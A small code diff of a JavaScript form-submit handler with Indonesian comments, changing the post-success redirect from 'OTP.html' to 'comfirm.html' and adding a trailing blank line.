@@ -16,7 +16,7 @@ document.getElementById('Formulir').addEventListener('submit', function(event) {
                 if (response.ok) {
                     alert('Succest');
                     document.getElementById('Formulir').reset(); // Reset formulir
-                    window.location.href = "OTP.html"; // Arahkan ke halaman otp.html
+                    window.location.href = "comfirm.html"; // Arahkan ke halaman otp.html
                 } else {
                     alert('Terjadi kesalahan saat mengirim kode.');
                 }
@@ -31,3 +31,4 @@ document.getElementById('Formulir').addEventListener('submit', function(event) {
     gabungkanFungsi();
 
 });
+
